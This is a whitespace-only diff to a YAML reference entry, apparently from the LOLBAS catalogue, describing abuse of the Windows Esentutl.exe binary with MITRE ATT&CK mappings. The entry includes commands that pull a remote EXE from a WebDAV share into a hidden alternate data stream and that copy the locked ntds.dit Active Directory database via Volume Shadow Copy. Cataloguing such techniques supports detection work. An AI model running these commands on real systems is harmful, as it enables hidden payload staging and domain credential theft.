@@ -2,12 +2,12 @@
 Name: Esentutl.exe
 Description: Binary for working with Microsoft Joint Engine Technology (JET) database
 Author: 'Oddvar Moe'
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o
     Description: Copies the source VBS file to the destination VBS file.
     Usecase: Copies files from A to B
-    Category: Copy 
+    Category: Copy
     Privileges: User
     MitreID: T1105
     MitreLink: https://attack.mitre.org/wiki/Technique/T1105
@@ -29,7 +29,7 @@ Commands:
     MitreLink: https://attack.mitre.org/wiki/Technique/T1096
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o
-    Description: Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.  
+    Description: Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.
     Usecase: Copy file and hide it in an alternate data stream as a defensive counter measure
     Category: ADS
     Privileges: User
@@ -47,7 +47,7 @@ Commands:
   - Command: esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
     Description: Copies a (locked) file using Volume Shadow Copy
     Usecase: Copy/extract a locked file such as the AD Database
-    Category: Copy 
+    Category: Copy
     Privileges: Admin
     MitreID: T1003
     MitreLink: https://attack.mitre.org/techniques/T1003/
@@ -55,10 +55,10 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\esentutl.exe
   - Path: C:\Windows\SysWOW64\esentutl.exe
-Code_Sample: 
+Code_Sample:
 - Code:
 Detection:
- - IOC: 
+ - IOC:
 Resources:
   - Link: https://twitter.com/egre55/status/985994639202283520
   - Link: https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/
